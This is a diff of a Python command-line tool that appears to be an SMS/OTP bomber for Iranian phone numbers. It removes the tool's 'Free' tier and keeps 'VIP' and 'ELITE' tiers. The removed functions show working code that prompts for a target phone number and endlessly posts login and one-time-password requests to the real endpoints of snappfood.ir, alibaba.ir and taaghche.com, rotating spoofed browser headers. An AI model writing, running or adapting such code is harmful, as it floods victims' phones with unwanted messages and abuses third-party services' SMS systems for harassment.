@@ -14,13 +14,13 @@ import numpy
 
 os.system('cls')
 
-green="\033[32m"
-red ="\033[31m"
-blue="\033[36m"
-pink="\033[35m"
-yellow="\033[93m"
-darkblue="\033[34m" 
-white="\033[00m"
+green = "\033[32m"
+red = "\033[31m"
+blue = "\033[36m"
+pink = "\033[35m"
+yellow = "\033[93m"
+darkblue = "\033[34m" 
+white = "\033[00m"
 
 version = "V1.0.9"
 
@@ -88,6 +88,7 @@ heads1 = [
         'Accept': '*/*'
     },
 ]
+
 heads2 = [
     {
         'User-Agent':'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
@@ -196,14 +197,12 @@ heads2 = [
 
 def servers():
     print(F'{darkblue}')
-    print("              Servers                                                         ")
+    print("                      Servers                                                         ")
     print(F'{white}'"[+]"F'{darkblue}'"==================================="F'{white}'"[+]")
     print("                                                                              ")
-    print(F'{white}'"  ["F'{red}'"1"F'{white}'"]"F'{green}'" Free Server                  ")
+    print(F'{white}'"  ["F'{red}'"1"F'{white}'"]"F'{yellow}'" VIP Server                  ")
     print(F'{darkblue}'"  +===============+                                               ")
-    print(F'{white}'"  ["F'{red}'"2"F'{white}'"]"F'{yellow}'" VIP Server                  ")
-    print(F'{darkblue}'"  +===============+                                               ")
-    print(F'{white}'"  ["F'{red}'"3"F'{white}'"]"F'{darkblue}'" ELITE Server              ")
+    print(F'{white}'"  ["F'{red}'"2"F'{white}'"]"F'{darkblue}'" ELITE Server              ")
 
 
 
@@ -252,65 +251,6 @@ rd = random.choice([tip,tip2,tip3,tip5])()
 print(rd)
 os.system("cls")
 
-
-# call-api
-
-def server_Free1(): # snappfood FREE
-    print(F'{yellow}')
-    number = input("Target phone number +98 : ")
-    os.system("cls")
-
-    url_snappfood = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=a10f75a1-6bff-4a02-9433-b57d09d09e86&locale=fa"
-    json_snappfood = {"cellphone":"0"+number}            
-
-
-    os.system("cls")
-    print(F'{yellow}')
-    while True:
-        print(F'{green}')
-        random_heads_free1 = random.choice(heads1)
-
-        req_Free1 = requests.post(url=url_snappfood,json=json_snappfood,headers=random_heads_free1)
-        time.sleep(2)
-        print("Send")
-
-
-def server_Free2(): # alibaba FREE
-    print(F'{yellow}')
-    number = input("Target phone number +98 : ")
-    os.system("cls")
-
-    url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
-    json_alibaba ={"phoneNumber": number}
-
-    os.system("cls")
-    print(F'{yellow}')
-    while True:
-        print(F'{green}')
-        random_heads_free2 = random.choice(heads1)
-
-        req_Free2 = requests.post(url=url_alibaba,json=json_alibaba,headers=random_heads_free2)
-        time.sleep(2)
-        print("Send")
-
-
-def server_Free3():
-    print(F'{yellow}')
-    number = input("Target phone number +98 : ")
-    os.system("cls")
-
-    url_tagche = "https://gw.taaghche.com/v4/site/auth/login"
-    json_tagche = {"contact":number,"forceOtp":"true"}
-
-    os.system("cls")
-    print(F'{yellow}')
-    while True:
-        print(F'{green}')
-        random_heads_free3 = random.choice(heads1)
-
-        req_Free3 = requests.post(url=url_tagche,json=json_tagche,headers=random_heads_free3)
-        time.sleep(2)
-        print("Send")
 
 
 # VIP
@@ -535,11 +475,9 @@ def banner():
         servers()
         selector_server = int(input("-> "))
         if selector_server == 1:
-            server_banner_FREE()
-        elif selector_server == 2:
             server_banner_VIP()
-        elif selector_server == 3:
-            server_banner_ELITE()
+        elif selector_server == 2:
+            server_banner_ELITE()            
     elif i == 2:
         os.system("cls")
         about()
@@ -562,38 +500,6 @@ def banner():
 #def timer():
 #    print("1",time.sleep(1.5),"2",time.sleep(1.5),"3",time.sleep(1.5))
 
-def server_banner_FREE():
-    os.system("cls")
-    print(F'{white}')
-
-    print("<== FREEs ==>")
-    print(F'{red}')
-    print("1) Server1 | 40%")
-
-    print(F'{white}')
-    print("+=================+")
-
-    print(F'{yellow}')
-    print("2) Server2 | 50%")
-
-    print(F'{white}')
-    print("+=================+")
-
-    print(F'{green}')
-    print("3) Server3 | 70%")
-
-    print(F'{yellow}')
-    select_FREE = int(input("[Free] Select Server ->"))
-    if select_FREE == 1:
-        server_Free1()
-    elif select_FREE == 2:
-        server_Free2()
-    elif select_FREE == 3:
-        server_Free3()
-    else:
-        print(F'{red}')
-        print("ERROR")
-        banner()
 
 def server_banner_VIP():
     os.system("cls")
